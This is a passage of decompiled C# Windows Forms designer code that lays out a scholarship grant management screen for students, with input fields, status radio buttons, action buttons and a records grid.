		((Control)txtb_studLevel).set_Name("txtb_studLevel");
		((Control)txtb_studLevel).set_Size(new Size(149, 26));
		((Control)txtb_studLevel).set_TabIndex(6);
		((TextBoxBase)txtb_studFname).set_BackColor(Color.White);
		((Control)txtb_studFname).set_Enabled(false);
		((Control)txtb_studFname).set_Location(new Point(88, 60));
		((Control)txtb_studFname).set_Name("txtb_studFname");
		((Control)txtb_studFname).set_Size(new Size(103, 26));
		((Control)txtb_studFname).set_TabIndex(6);
		Label11.set_AutoSize(true);
		((Control)Label11).set_Font(new Font("Franklin Gothic Medium Cond", 20f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label11).set_Location(new Point(383, 82));
		((Control)Label11).set_Name("Label11");
		((Control)Label11).set_Size(new Size(299, 34));
		((Control)Label11).set_TabIndex(40);
		Label11.set_Text("SCHOLARSHIP GRANT LIST");
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox3).get_Controls().Add((Control)(object)txtb_refNo);
		((Control)GroupBox3).get_Controls().Add((Control)(object)cbo_scholarType);
		((Control)GroupBox3).get_Controls().Add((Control)(object)rb_inactive);
		((Control)GroupBox3).get_Controls().Add((Control)(object)rb_active);
		((Control)GroupBox3).get_Controls().Add((Control)(object)RadioButton1);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label13);
		((Control)GroupBox3).get_Controls().Add((Control)(object)txtb_ScholarAmnt);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label12);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label16);
		((Control)GroupBox3).set_Font(new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox3).set_Location(new Point(11, 280));
		((Control)GroupBox3).set_Name("GroupBox3");
		((Control)GroupBox3).set_Size(new Size(441, 165));
		((Control)GroupBox3).set_TabIndex(39);
		GroupBox3.set_TabStop(false);
		GroupBox3.set_Text("SCHOLARSHIP INFORMATION");
		Label4.set_AutoSize(true);
		Label4.set_ImeMode((ImeMode)0);
		((Control)Label4).set_Location(new Point(19, 23));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(121, 21));
		((Control)Label4).set_TabIndex(22);
		Label4.set_Text("SCHOLAR REF. NO.");
		txtb_refNo.get_AutoCompleteCustomSource().AddRange(new string[40]
		{
			"Niño Agsoy", "Tajmahal Amarila", "Joshua Avila", "Harvey Baloria", "Faith Claire Bawan", "Mark Bello", "Charmel Camposo", "Kristel Ann Corpuz", "Princess Anne Dadul", "Vj Debuque",
			"Juvy Dela Cruz", "Laica Joy Delostrico", "Charles Deragosa", "Chris Lyn Joyce Diaz", "Amado Doverte", "John Mark Dulce", "James Bryan N. Dumail", "Junelyn Gumia", "Jessa Langwas", "Annalyn Larita",
			"Rhea Lynn Legaspi", "Mayter Lumiguid", "Charlene Manabat", "John Vincent A. Medillo", "Jericho Montealto", "Wendel Odilao", "Kurt Randall Oviedo", "Elson Patac", "Kate Pendon", "Carren Polinio",
			"Jhon Philip Pondar", "Arnic Reponte", "Quirjhon Dave Rivera", "Hanna Gladys Sala", "ARIEL SAOCEJO", "Rea Siarot", "Robel Sta Teresa", "Venus Torrevillas", "Tyrone Vibas", "Jerald Jose"
		});
		((Control)txtb_refNo).set_Enabled(false);
		((Control)txtb_refNo).set_Location(new Point(180, 23));
		((Control)txtb_refNo).set_Name("txtb_refNo");
		((Control)txtb_refNo).set_Size(new Size(252, 26));
		((Control)txtb_refNo).set_TabIndex(8);
		cbo_scholarType.set_DropDownStyle((ComboBoxStyle)2);
		((Control)cbo_scholarType).set_Enabled(false);
		((ListControl)cbo_scholarType).set_FormattingEnabled(true);
		cbo_scholarType.get_Items().AddRange(new object[2] { "Id Number", "Name" });
		((Control)cbo_scholarType).set_Location(new Point(180, 59));
		((Control)cbo_scholarType).set_Name("cbo_scholarType");
		((Control)cbo_scholarType).set_Size(new Size(252, 29));
		((Control)cbo_scholarType).set_TabIndex(8);
		((ButtonBase)rb_inactive).set_AutoSize(true);
		((Control)rb_inactive).set_Location(new Point(265, 136));
		((Control)rb_inactive).set_Name("rb_inactive");
		((Control)rb_inactive).set_Size(new Size(81, 25));
		((Control)rb_inactive).set_TabIndex(21);
		((ButtonBase)rb_inactive).set_Text("INACTIVE");
		((ButtonBase)rb_inactive).set_UseVisualStyleBackColor(true);
		((ButtonBase)rb_active).set_AutoSize(true);
		((Control)rb_active).set_Location(new Point(176, 136));
		((Control)rb_active).set_Name("rb_active");
		((Control)rb_active).set_Size(new Size(68, 25));
		((Control)rb_active).set_TabIndex(20);
		((ButtonBase)rb_active).set_Text("ACTIVE");
		((ButtonBase)rb_active).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		((Control)RadioButton1).set_Location(new Point(176, 136));
		((Control)RadioButton1).set_Name("RadioButton1");
		((Control)RadioButton1).set_Size(new Size(64, 25));
		((Control)RadioButton1).set_TabIndex(20);
		((ButtonBase)RadioButton1).set_Text("Active");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		Label13.set_AutoSize(true);
		Label13.set_ImeMode((ImeMode)0);
		((Control)Label13).set_Location(new Point(19, 138));
		((Control)Label13).set_Name("Label13");
		((Control)Label13).set_Size(new Size(144, 21));
		((Control)Label13).set_TabIndex(19);
		Label13.set_Text("SCHOLARSHIP STATUS");
		((TextBoxBase)txtb_ScholarAmnt).set_BackColor(Color.White);
		((Control)txtb_ScholarAmnt).set_Enabled(false);
		((Control)txtb_ScholarAmnt).set_Location(new Point(180, 99));
		((Control)txtb_ScholarAmnt).set_Name("txtb_ScholarAmnt");
		((Control)txtb_ScholarAmnt).set_Size(new Size(252, 26));
		((Control)txtb_ScholarAmnt).set_TabIndex(18);
		Label12.set_AutoSize(true);
		Label12.set_ImeMode((ImeMode)0);
		((Control)Label12).set_Location(new Point(19, 104));
		((Control)Label12).set_Name("Label12");
		((Control)Label12).set_Size(new Size(151, 21));
		((Control)Label12).set_TabIndex(17);
		Label12.set_Text("SCHOLARSHIP AMOUNT");
		Label16.set_AutoSize(true);
		Label16.set_ImeMode((ImeMode)0);
		((Control)Label16).set_Location(new Point(19, 62));
		((Control)Label16).set_Name("Label16");
		((Control)Label16).set_Size(new Size(127, 21));
		((Control)Label16).set_TabIndex(15);
		Label16.set_Text("SCHOLARSHIP TYPE");
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Activecolor", new object[1] { Color.FromArgb(46, 139, 87) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Anchor", new object[1] { (object)(AnchorStyles)8 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "BackColor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "BackgroundImageLayout", new object[1] { (object)(ImageLayout)3 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "BorderRadius", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "BorderStyle", new object[1] { (object)(BorderStyle)2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "ButtonText", new object[1] { "CANCEL" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Cursor", new object[1] { Cursors.get_Hand() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "DisabledColor", new object[1] { Color.Gray }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Font", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "ForeColor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Iconcolor", new object[1] { Color.Transparent }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Iconimage", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Iconimage_right", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Iconimage_right_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Iconimage_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IconMarginLeft", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IconMarginRight", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IconRightVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IconRightZoom", new object[1] { 0.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IconVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IconZoom", new object[1] { 90.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "IsTab", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Location", new object[1]
		{
			new Point(21, 462)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Margin", new object[1] { (object)new Padding(3, 5, 3, 5) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Name", new object[1] { "btn_cancel" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Normalcolor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "OnHovercolor", new object[1] { Color.Goldenrod }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "OnHoverTextColor", new object[1] { Color.White }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "selected", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Size", new object[1]
		{
			new Size(136, 35)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "TabIndex", new object[1] { 55 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Text", new object[1] { "CANCEL" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "Textcolor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_cancel, (Type)null, "TextFont", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Activecolor", new object[1] { Color.FromArgb(46, 139, 87) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Anchor", new object[1] { (object)(AnchorStyles)8 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "BackColor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "BackgroundImageLayout", new object[1] { (object)(ImageLayout)3 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "BorderRadius", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "BorderStyle", new object[1] { (object)(BorderStyle)2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "ButtonText", new object[1] { "ADD" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Cursor", new object[1] { Cursors.get_Hand() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "DisabledColor", new object[1] { Color.Gray }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Font", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "ForeColor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Iconcolor", new object[1] { Color.Transparent }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Iconimage", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Iconimage_right", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Iconimage_right_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Iconimage_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IconMarginLeft", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IconMarginRight", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IconRightVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IconRightZoom", new object[1] { 0.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IconVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IconZoom", new object[1] { 90.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "IsTab", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Location", new object[1]
		{
			new Point(161, 462)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Margin", new object[1] { (object)new Padding(3, 5, 3, 5) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Name", new object[1] { "btn_add" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Normalcolor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "OnHovercolor", new object[1] { Color.Goldenrod }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "OnHoverTextColor", new object[1] { Color.White }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "selected", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Size", new object[1]
		{
			new Size(136, 35)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "TabIndex", new object[1] { 54 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Text", new object[1] { "ADD" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Textcolor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "TextFont", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Activecolor", new object[1] { Color.FromArgb(46, 139, 87) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Anchor", new object[1] { (object)(AnchorStyles)8 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "BackColor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "BackgroundImageLayout", new object[1] { (object)(ImageLayout)3 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "BorderRadius", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "BorderStyle", new object[1] { (object)(BorderStyle)2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "ButtonText", new object[1] { "UPDATE" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Cursor", new object[1] { Cursors.get_Hand() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "DisabledColor", new object[1] { Color.Gray }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Font", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "ForeColor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Iconcolor", new object[1] { Color.Transparent }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Iconimage", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Iconimage_right", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Iconimage_right_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Iconimage_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IconMarginLeft", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IconMarginRight", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IconRightVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IconRightZoom", new object[1] { 0.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IconVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IconZoom", new object[1] { 90.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "IsTab", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Location", new object[1]
		{
			new Point(303, 462)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Margin", new object[1] { (object)new Padding(3, 5, 3, 5) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Name", new object[1] { "btn_update" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Normalcolor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "OnHovercolor", new object[1] { Color.Goldenrod }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "OnHoverTextColor", new object[1] { Color.White }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "selected", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Size", new object[1]
		{
			new Size(136, 35)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "TabIndex", new object[1] { 53 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Text", new object[1] { "UPDATE" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Textcolor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "TextFont", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0) }, (string[])null, (Type[])null, false, true);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)btn_manageScholar);
		((Control)Panel1).get_Controls().Add((Control)btn_cancel);
		((Control)Panel1).get_Controls().Add((Control)btn_add);
		((Control)Panel1).get_Controls().Add((Control)(object)GroupBox2);
		((Control)Panel1).get_Controls().Add((Control)btn_update);
		((Control)Panel1).get_Controls().Add((Control)(object)GroupBox3);
		((Control)Panel1).set_Location(new Point(15, 135));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(459, 506));
		((Control)Panel1).set_TabIndex(49);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Activecolor", new object[1] { Color.FromArgb(46, 139, 87) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Anchor", new object[1] { (object)(AnchorStyles)8 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "BackColor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "BackgroundImageLayout", new object[1] { (object)(ImageLayout)3 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "BorderRadius", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "BorderStyle", new object[1] { (object)(BorderStyle)2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "ButtonText", new object[1] { "MANAGE SCHOLARSHIP DETAILS" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Cursor", new object[1] { Cursors.get_Hand() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "DisabledColor", new object[1] { Color.Gray }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Font", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "ForeColor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Iconcolor", new object[1] { Color.Transparent }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Iconimage", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Iconimage_right", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Iconimage_right_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Iconimage_Selected", new object[1], (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IconMarginLeft", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IconMarginRight", new object[1] { 0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IconRightVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IconRightZoom", new object[1] { 0.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IconVisible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IconZoom", new object[1] { 90.0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "IsTab", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Location", new object[1]
		{
			new Point(227, 221)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Margin", new object[1] { (object)new Padding(3, 5, 3, 5) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Name", new object[1] { "btn_manageScholar" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Normalcolor", new object[1] { SystemColors.ButtonFace }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "OnHovercolor", new object[1] { Color.Goldenrod }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "OnHoverTextColor", new object[1] { Color.White }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "selected", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Size", new object[1]
		{
			new Size(216, 35)
		}, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "TabIndex", new object[1] { 56 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Text", new object[1] { "MANAGE SCHOLARSHIP DETAILS" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "Textcolor", new object[1] { Color.SeaGreen }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_manageScholar, (Type)null, "TextFont", new object[1] { (object)new Font("Franklin Gothic Medium Cond", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0) }, (string[])null, (Type[])null, false, true);
		((Panel)FlowLayoutPanel1).set_BorderStyle((BorderStyle)2);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)GroupBox1);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Panel3);
		((Control)FlowLayoutPanel1).set_Location(new Point(480, 135));
		((Control)FlowLayoutPanel1).set_Name("FlowLayoutPanel1");
		((Control)FlowLayoutPanel1).set_Size(new Size(564, 506));
		((Control)FlowLayoutPanel1).set_TabIndex(50);
		((Control)Panel3).get_Controls().Add((Control)dg_StudScholarRec);
		((Control)Panel3).set_Dock((DockStyle)1);
		((Control)Panel3).set_Font(new Font("Franklin Gothic Demi", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Panel3).set_Location(new Point(3, 79));
		((Control)Panel3).set_Name("Panel3");
		((Control)Panel3).set_Size(new Size(557, 418));
		((Control)Panel3).set_TabIndex(38);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "AllowUserToAddRows", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "AllowUserToDeleteRows", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "AllowUserToResizeRows", new object[1] { false }, (string[])null, (Type[])null, false, true);
		val.set_BackColor(Color.FromArgb(224, 224, 224));
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "AlternatingRowsDefaultCellStyle", new object[1] { val }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "AutoSizeColumnsMode", new object[1] { (object)(DataGridViewAutoSizeColumnsMode)16 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "BackgroundColor", new object[1] { Color.Gainsboro }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "BorderStyle", new object[1] { (object)(BorderStyle)0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(dg_StudScholarRec, (Type)null, "ColumnHeadersBorderStyle", new object[1] { (object)(DataGridViewHeaderBorderStyle)1 }, (string[])null, (Type[])null, false, true);
